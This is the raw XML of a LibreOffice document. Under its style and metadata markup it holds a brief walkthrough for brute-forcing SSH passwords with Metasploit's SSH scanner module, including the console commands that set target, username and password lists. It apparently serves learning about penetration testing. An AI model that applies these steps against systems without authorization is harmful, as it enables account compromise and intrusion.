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44c1" officeooo:paragraph-rsid="001444c1" style:font-size-asian="17.5pt" style:font-size-complex="20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444c1" officeooo:paragraph-rsid="001444c1" style:font-size-asian="13.1000003814697pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="001444c1" officeooo:paragraph-rsid="001444c1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152b43" officeooo:paragraph-rsid="00152b43" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="00152b43" officeooo:paragraph-rsid="00152b43" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="00152b43" officeooo:paragraph-rsid="00152b43" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00152b43"/>
    </style:style>
    <style:style style:name="T3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</text:span> to crack SSH passwords (Brute Force)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Start ‘Postgresql’ service (Install if needed with <text:span text:style-name="T1">sudo apt install postgresql</text:span>)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">sudo service postgresql start</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Start Metasploit (<text:span text:style-name="T1">msfconsole</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Search for ssh modules</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5">search ssh</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">Select ‘SSH Scanner’ from the list</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P5">use [# of SSH Scanner]</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">Type in the following lines of code to set the settings for the attack:</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P5">set rhosts [Target IP]</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">set stop_on_success true</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">set user_file [Path to file]</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">set password_file [Path to file]</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">set verbose true</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">Now, type <text:span text:style-name="T1">run </text:span>to begin the attack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, Menl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3:41:34.941735293</meta:creation-date>
    <meta:editing-duration>PT7M39S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/7.0.5.2$Linux_X86_64 LibreOffice_project/00$Build-2</meta:generator>
    <dc:date>2021-04-16T13:30:45.637880043</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="15" meta:word-count="83" meta:character-count="491" meta:non-whitespace-character-count="423"/>
  </office:meta>
</office:document-meta>
</file>